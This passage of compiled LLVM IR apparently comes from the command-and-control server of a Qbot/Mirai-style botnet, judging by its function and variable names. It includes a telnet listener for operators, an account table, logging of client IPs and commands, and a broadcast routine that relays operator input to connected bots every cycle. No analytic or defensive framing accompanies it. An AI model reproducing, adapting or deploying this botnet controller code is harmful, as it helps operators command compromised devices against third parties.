  %2638 = icmp eq i64 %2637, -1
  br i1 %2638, label %2639, label %2640

2639:                                             ; preds = %2630
  store i8* null, i8** %2, align 8
  br label %2816

2640:                                             ; preds = %2630
  br label %2641

2641:                                             ; preds = %2640, %2626
  %2642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2643 = call i8* @strstr(i8* %2642, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.242, i64 0, i64 0)) #9
  %2644 = icmp ne i8* %2643, null
  br i1 %2644, label %2645, label %2656

2645:                                             ; preds = %2641
  %2646 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2647 = call i32 (i8*, i8*, ...) @sprintf(i8* %2646, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.243, i64 0, i64 0)) #8
  %2648 = load i32, i32* %4, align 4
  %2649 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2651 = call i64 @strlen(i8* %2650) #9
  %2652 = call i64 @send(i32 %2648, i8* %2649, i64 %2651, i32 16384)
  %2653 = icmp eq i64 %2652, -1
  br i1 %2653, label %2654, label %2655

2654:                                             ; preds = %2645
  store i8* null, i8** %2, align 8
  br label %2816

2655:                                             ; preds = %2645
  br label %2656

2656:                                             ; preds = %2655, %2641
  %2657 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2658 = call i8* @strstr(i8* %2657, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.244, i64 0, i64 0)) #9
  %2659 = icmp ne i8* %2658, null
  br i1 %2659, label %2660, label %2671

2660:                                             ; preds = %2656
  %2661 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2662 = call i32 (i8*, i8*, ...) @sprintf(i8* %2661, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.245, i64 0, i64 0)) #8
  %2663 = load i32, i32* %4, align 4
  %2664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2665 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2666 = call i64 @strlen(i8* %2665) #9
  %2667 = call i64 @send(i32 %2663, i8* %2664, i64 %2666, i32 16384)
  %2668 = icmp eq i64 %2667, -1
  br i1 %2668, label %2669, label %2670

2669:                                             ; preds = %2660
  store i8* null, i8** %2, align 8
  br label %2816

2670:                                             ; preds = %2660
  br label %2671

2671:                                             ; preds = %2670, %2656
  %2672 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2673 = call i8* @strstr(i8* %2672, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.246, i64 0, i64 0)) #9
  %2674 = icmp ne i8* %2673, null
  br i1 %2674, label %2675, label %2686

2675:                                             ; preds = %2671
  %2676 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2677 = call i32 (i8*, i8*, ...) @sprintf(i8* %2676, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.247, i64 0, i64 0)) #8
  %2678 = load i32, i32* %4, align 4
  %2679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2680 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2681 = call i64 @strlen(i8* %2680) #9
  %2682 = call i64 @send(i32 %2678, i8* %2679, i64 %2681, i32 16384)
  %2683 = icmp eq i64 %2682, -1
  br i1 %2683, label %2684, label %2685

2684:                                             ; preds = %2675
  store i8* null, i8** %2, align 8
  br label %2816

2685:                                             ; preds = %2675
  br label %2686

2686:                                             ; preds = %2685, %2671
  %2687 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2688 = call i8* @strstr(i8* %2687, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.248, i64 0, i64 0)) #9
  %2689 = icmp ne i8* %2688, null
  br i1 %2689, label %2690, label %2701

2690:                                             ; preds = %2686
  %2691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2692 = call i32 (i8*, i8*, ...) @sprintf(i8* %2691, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.249, i64 0, i64 0)) #8
  %2693 = load i32, i32* %4, align 4
  %2694 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2695 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2696 = call i64 @strlen(i8* %2695) #9
  %2697 = call i64 @send(i32 %2693, i8* %2694, i64 %2696, i32 16384)
  %2698 = icmp eq i64 %2697, -1
  br i1 %2698, label %2699, label %2700

2699:                                             ; preds = %2690
  store i8* null, i8** %2, align 8
  br label %2816

2700:                                             ; preds = %2690
  br label %2701

2701:                                             ; preds = %2700, %2686
  %2702 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2703 = call i8* @strstr(i8* %2702, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.250, i64 0, i64 0)) #9
  %2704 = icmp ne i8* %2703, null
  br i1 %2704, label %2705, label %2716

2705:                                             ; preds = %2701
  %2706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2707 = call i32 (i8*, i8*, ...) @sprintf(i8* %2706, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.251, i64 0, i64 0)) #8
  %2708 = load i32, i32* %4, align 4
  %2709 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2711 = call i64 @strlen(i8* %2710) #9
  %2712 = call i64 @send(i32 %2708, i8* %2709, i64 %2711, i32 16384)
  %2713 = icmp eq i64 %2712, -1
  br i1 %2713, label %2714, label %2715

2714:                                             ; preds = %2705
  store i8* null, i8** %2, align 8
  br label %2816

2715:                                             ; preds = %2705
  br label %2716

2716:                                             ; preds = %2715, %2701
  %2717 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2718 = call i8* @strstr(i8* %2717, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.252, i64 0, i64 0)) #9
  %2719 = icmp ne i8* %2718, null
  br i1 %2719, label %2720, label %2731

2720:                                             ; preds = %2716
  %2721 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2722 = call i32 (i8*, i8*, ...) @sprintf(i8* %2721, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.253, i64 0, i64 0)) #8
  %2723 = load i32, i32* %4, align 4
  %2724 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2725 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2726 = call i64 @strlen(i8* %2725) #9
  %2727 = call i64 @send(i32 %2723, i8* %2724, i64 %2726, i32 16384)
  %2728 = icmp eq i64 %2727, -1
  br i1 %2728, label %2729, label %2730

2729:                                             ; preds = %2720
  store i8* null, i8** %2, align 8
  br label %2816

2730:                                             ; preds = %2720
  br label %2731

2731:                                             ; preds = %2730, %2716
  %2732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2733 = call i8* @strstr(i8* %2732, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.254, i64 0, i64 0)) #9
  %2734 = icmp ne i8* %2733, null
  br i1 %2734, label %2735, label %2736

2735:                                             ; preds = %2731
  br label %284

2736:                                             ; preds = %2731
  %2737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2738 = call i8* @strstr(i8* %2737, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.255, i64 0, i64 0)) #9
  %2739 = icmp ne i8* %2738, null
  br i1 %2739, label %2740, label %2741

2740:                                             ; preds = %2736
  br label %284

2741:                                             ; preds = %2736
  %2742 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2743 = call i8* @strstr(i8* %2742, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.256, i64 0, i64 0)) #9
  %2744 = icmp ne i8* %2743, null
  br i1 %2744, label %2745, label %2746

2745:                                             ; preds = %2741
  br label %284

2746:                                             ; preds = %2741
  %2747 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2748 = call i8* @strstr(i8* %2747, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.257, i64 0, i64 0)) #9
  %2749 = icmp ne i8* %2748, null
  br i1 %2749, label %2750, label %2751

2750:                                             ; preds = %2746
  br label %284

2751:                                             ; preds = %2746
  %2752 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2753 = call i8* @strstr(i8* %2752, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i64 0, i64 0)) #9
  %2754 = icmp ne i8* %2753, null
  br i1 %2754, label %2755, label %2756

2755:                                             ; preds = %2751
  br label %2807

2756:                                             ; preds = %2751
  %2757 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2758 = call i8* @strstr(i8* %2757, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.259, i64 0, i64 0)) #9
  %2759 = icmp ne i8* %2758, null
  br i1 %2759, label %2760, label %2761

2760:                                             ; preds = %2756
  br label %2807

2761:                                             ; preds = %2756
  %2762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* %2762)
  %2763 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2764 = load i32, i32* %5, align 4
  %2765 = sext i32 %2764 to i64
  %2766 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2765
  %2767 = getelementptr inbounds %struct.account, %struct.account* %2766, i32 0, i32 0
  %2768 = getelementptr inbounds [200 x i8], [200 x i8]* %2767, i64 0, i64 0
  %2769 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2770 = call i32 (i8*, i8*, ...) @sprintf(i8* %2763, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %2768, i8* %2769) #8
  %2771 = load i32, i32* %4, align 4
  %2772 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2773 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2774 = call i64 @strlen(i8* %2773) #9
  %2775 = call i64 @send(i32 %2771, i8* %2772, i64 %2774, i32 16384)
  %2776 = icmp eq i64 %2775, -1
  br i1 %2776, label %2777, label %2778

2777:                                             ; preds = %2761
  br label %2807

2778:                                             ; preds = %2761
  %2779 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2780 = call i64 @strlen(i8* %2779) #9
  %2781 = icmp eq i64 %2780, 0
  br i1 %2781, label %2782, label %2783

2782:                                             ; preds = %2778
  br label %426, !llvm.loop !26

2783:                                             ; preds = %2778
  %2784 = load i32, i32* %5, align 4
  %2785 = sext i32 %2784 to i64
  %2786 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2785
  %2787 = getelementptr inbounds %struct.account, %struct.account* %2786, i32 0, i32 0
  %2788 = getelementptr inbounds [200 x i8], [200 x i8]* %2787, i64 0, i64 0
  %2789 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2790 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.260, i64 0, i64 0), i8* %2788, i8* %2789)
  %2791 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.261, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i64 0, i64 0))
  store %struct._IO_FILE* %2791, %struct._IO_FILE** %170, align 8
  %2792 = load %struct._IO_FILE*, %struct._IO_FILE** %170, align 8
  %2793 = load i32, i32* %5, align 4
  %2794 = sext i32 %2793 to i64
  %2795 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2794
  %2796 = getelementptr inbounds %struct.account, %struct.account* %2795, i32 0, i32 0
  %2797 = getelementptr inbounds [200 x i8], [200 x i8]* %2796, i64 0, i64 0
  %2798 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2799 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2792, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.260, i64 0, i64 0), i8* %2797, i8* %2798)
  %2800 = load %struct._IO_FILE*, %struct._IO_FILE** %170, align 8
  %2801 = call i32 @fclose(%struct._IO_FILE* %2800)
  %2802 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2803 = load i32, i32* %4, align 4
  %2804 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  call void @broadcast(i8* %2802, i32 %2803, i8* %2804)
  %2805 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %2805, i8 0, i64 2048, i1 false)
  br label %426, !llvm.loop !26

2806:                                             ; preds = %426
  br label %2807

2807:                                             ; preds = %2806, %2777, %2760, %2755, %2277, %2254, %2231, %2149, %2130, %2122, %2114, %2106, %2098, %2090, %2082, %2074, %2041, %2022, %2014, %2006, %1998, %1990, %1982, %1974, %1966, %1958, %1950, %1942, %1934, %1926, %1918, %1910, %1902, %1894, %1886, %1878, %1870, %1862, %1854, %1846, %1776, %1757, %1749, %1741, %1733, %1725, %1717, %1709, %1701, %1693, %1685, %1677, %1638, %1619, %1611, %1603, %1595, %1587, %1579, %1571, %1563, %1530, %1511, %1503, %1495, %1487, %1479, %1471, %1463, %1455, %1447, %1439, %1431, %1423, %1415, %1372, %1353, %1345, %1337, %1329, %1321, %1313, %1305, %1274, %1255, %1247, %1239, %1231, %1223, %1193, %1174, %1166, %1158, %1150, %1142, %1134, %1126, %1118, %1110, %1102, %1094, %1086, %1036, %1017, %1009, %1001, %993, %985, %977, %969, %961, %917, %898, %890, %882, %874, %866, %858, %850, %810, %791, %783, %775, %767, %759, %751, %743, %735, %727, %719, %711, %540, %532, %524, %516, %508, %500, %492, %417, %400, %392, %384, %376, %368, %360, %352, %344, %336, %328, %320, %295, %290, %282, %263, %257, %231, %225
  %2808 = load i32, i32* %4, align 4
  %2809 = sext i32 %2808 to i64
  %2810 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2809
  %2811 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2810, i32 0, i32 1
  store i32 0, i32* %2811, align 4
  %2812 = load i32, i32* %4, align 4
  %2813 = call i32 @close(i32 %2812)
  %2814 = load volatile i32, i32* @managesConnected, align 4
  %2815 = add nsw i32 %2814, -1
  store volatile i32 %2815, i32* @managesConnected, align 4
  br label %2816

2816:                                             ; preds = %2807, %2729, %2714, %2699, %2684, %2669, %2654, %2639, %2624, %2609, %2594, %2579, %2564, %2549, %2534, %2519, %2504, %2489, %2474, %2459, %2444, %2429, %2414, %2399, %2384, %2369, %2354, %2339, %2324, %2309, %2225, %2210, %2195, %2180, %2165, %656, %591
  %2817 = load i8*, i8** %2, align 8
  ret i8* %2817
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #2

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct._IO_FILE*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.262, i64 0, i64 0))
  br label %14

14:                                               ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %2, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 zeroext %20) #10
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %3, align 4
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* %24, i32 16) #8
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %14
  call void @perror(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.263, i64 0, i64 0))
  br label %28

28:                                               ; preds = %27, %14
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @listen(i32 %29, i32 5) #8
  store i32 16, i32* %5, align 4
  br label %31

31:                                               ; preds = %28, %68
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.264, i64 0, i64 0))
  %33 = bitcast %struct.sockaddr_in* %7 to { i64, i64 }*
  %34 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 4
  %36 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 1
  %37 = load i64, i64* %36, align 4
  call void @client_addr(i64 %35, i64 %37)
  %38 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i64 0, i64 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %8, align 8
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = and i32 %42, 255
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 65280
  %48 = lshr i32 %47, 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 16711680
  %53 = lshr i32 %52, 16
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, -16777216
  %58 = lshr i32 %57, 24
  %59 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %39, i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.265, i64 0, i64 0), i32 %43, i32 %48, i32 %53, i32 %58)
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %61 = call i32 @fclose(%struct._IO_FILE* %60)
  %62 = load i32, i32* %3, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @accept(i32 %62, %struct.sockaddr* %63, i32* %5)
  store i32 %64, i32* %4, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %31
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.266, i64 0, i64 0))
  br label %68

68:                                               ; preds = %67, %31
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %71) #8
  br label %31
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #8
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.267, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #9
  store i32 %27, i32* %10, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #9
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = icmp sgt i32 %32, 1000
  br i1 %33, label %34, label %36

34:                                               ; preds = %23
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.268, i64 0, i64 0))
  ret i32 0

36:                                               ; preds = %23
  %37 = load i32, i32* %9, align 4
  %38 = icmp slt i32 %37, 1000
  br i1 %38, label %39, label %41

39:                                               ; preds = %36
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.269, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %36
  br label %42

42:                                               ; preds = %41
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.270, i64 0, i64 0))
  %44 = load i8**, i8*** %6, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @create_and_bind(i8* %46)
  store volatile i32 %47, i32* @listenFD, align 4
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %42
  call void @abort() #11
  unreachable

51:                                               ; preds = %42
  %52 = load volatile i32, i32* @listenFD, align 4
  %53 = call i32 @make_socket_non_blocking(i32 %52)
  store i32 %53, i32* %8, align 4
  %54 = load i32, i32* %8, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  call void @abort() #11
  unreachable

57:                                               ; preds = %51
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = call i32 @listen(i32 %58, i32 4096) #8
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* %8, align 4
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %62, label %63

62:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.271, i64 0, i64 0))
  call void @abort() #11
  unreachable

63:                                               ; preds = %57
  %64 = call i32 @epoll_create1(i32 0) #8
  store volatile i32 %64, i32* @epollFD, align 4
  %65 = load volatile i32, i32* @epollFD, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %63
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.272, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %63
  %69 = load volatile i32, i32* @listenFD, align 4
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  store i32 %69, i32* %71, align 1
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %72, align 1
  %73 = load volatile i32, i32* @epollFD, align 4
  %74 = load volatile i32, i32* @listenFD, align 4
  %75 = call i32 @epoll_ctl(i32 %73, i32 1, i32 %74, %struct.epoll_event* %11) #8
  store i32 %75, i32* %8, align 4
  %76 = load i32, i32* %8, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

78:                                               ; preds = %68
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  call void @abort() #11
  unreachable

79:                                               ; preds = %68
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, 2
  %82 = zext i32 %81 to i64
  %83 = call i8* @llvm.stacksave()
  store i8* %83, i8** %12, align 8
  %84 = alloca i64, i64 %82, align 16
  store i64 %82, i64* %13, align 8
  br label %85

85:                                               ; preds = %89, %79
  %86 = load i32, i32* %9, align 4
  %87 = add nsw i32 %86, -1
  store i32 %87, i32* %9, align 4
  %88 = icmp ne i32 %86, 0
  br i1 %88, label %89, label %95

89:                                               ; preds = %85
  %90 = load i32, i32* %9, align 4
  %91 = add nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i64, i64* %84, i64 %92
  %94 = call i32 @pthread_create(i64* %93, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #8
  br label %85, !llvm.loop !27

95:                                               ; preds = %85
  %96 = getelementptr inbounds i64, i64* %84, i64 0
  %97 = load i32, i32* %10, align 4
  %98 = sext i32 %97 to i64
  %99 = inttoptr i64 %98 to i8*
  %100 = call i32 @pthread_create(i64* %96, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %99) #8
  br label %101

101:                                              ; preds = %102, %95
  br label %102

102:                                              ; preds = %101
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.273, i64 0, i64 0))
  %103 = call i32 @sleep(i32 60)
  br label %101
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
